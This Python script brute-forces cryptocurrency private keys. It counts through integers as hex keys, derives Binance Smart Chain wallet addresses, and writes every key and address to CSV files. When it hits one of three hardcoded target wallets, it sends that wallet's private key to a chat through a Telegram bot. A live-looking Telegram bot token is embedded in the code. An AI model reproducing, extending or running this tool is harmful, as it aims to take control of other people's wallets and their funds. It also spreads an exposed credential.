import pandas as pd
import telegram
import time
from telegram import ParseMode
import sys

pd.set_option("display.max_rows", None, "display.max_columns", None)

no = int(sys.argv[1])
ct = 1
my_token = '5005873186:AAFuUn2m68PXYt_fWmftx7zqbwSjK8hEB0w'
mxx = int(16**64)
split = int(mxx / 64)
range = split * no
from web3 import exceptions
from web3 import Web3
bsc = "https://bsc-dataseed.binance.org/"
web3 = None
walletsdf = pd.read_csv(f"wallet{no}.csv")
if walletsdf.isnull().values.any():
    walletsdf.dropna(inplace=True)
    walletsdf.to_csv(f"wallet{no}.csv")
inte = walletsdf['integer'].to_list()
dd = pd.DataFrame()
j, k, l = [], [], []


def send(msg, chat_id, token=my_token):
    bot = telegram.Bot(token=token)
    try:
        bot.sendMessage(chat_id=chat_id, text=msg, parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True)  # , disable_web_page_preview=True
    except:
        time.sleep(1)


def web3connected():
    global web3
    while not web3 or web3.isConnected is False:
        try:
            web3 = Web3(Web3.HTTPProvider(bsc))
        except exceptions:
            print("web3 retrying")
            continue
        break
    return web3


# noinspection PyRedeclaration
web3 = web3connected()
if walletsdf.empty:
    if no == 1:
        i = 1
    else:
        i = split * (no - 1)
else:
    i = int(inte[-1])

while i <= range:
    h = hex(i).replace("0x", "")
    # h = h.lstrip('0x')
    s = h.zfill(64)
    l.append(s)
    p = web3.eth.account.privateKeyToAccount(s)
    # p = None
    # while not p:
    #     try:
    #         p = web3.eth.account.privateKeyToAccount('0003243243244334')
    #     except:
    #         print("retrying")
    wallet = p.address
    if wallet in ['0xc426569b01e3f6ee8032242bdB4d3ecC29C61d32', '0x322171b59D3fc7EEF5912225906380e00BE318e8', '0x83094607d02053b2c1BF6193c68A82940d4b7D28']:
        send(f'<b>Wallet Discovered</b> : <code>{wallet}</code>'
             f'\n\n<b>Private key</b> : <code>{s}</code>',
             5090499539, my_token)
    k.append(wallet)
    j.append(i)
    print(f"Wallets Remaining:{range - i}")
    if (ct % 10000) == 0:
        walletsdf['integer'] = pd.Series(j)
        walletsdf['Wallet Address'] = pd.Series(k)
        walletsdf['Private key'] = pd.Series(l)
        walletsdf.to_csv(f'wallet{no}.csv', mode='a', index=False, header=False)
        j, k, l = [], [], []
    print(i)
    if i == range:
        walletsdf['integer'] = pd.Series(j)
        walletsdf['Wallet Address'] = pd.Series(k)
        walletsdf['Private key'] = pd.Series(l)
        walletsdf.to_csv(f'wallet{no}.csv', mode='a', index=False, header=False)
        j, k, l = [], [], []
    i += 1
    ct += 1

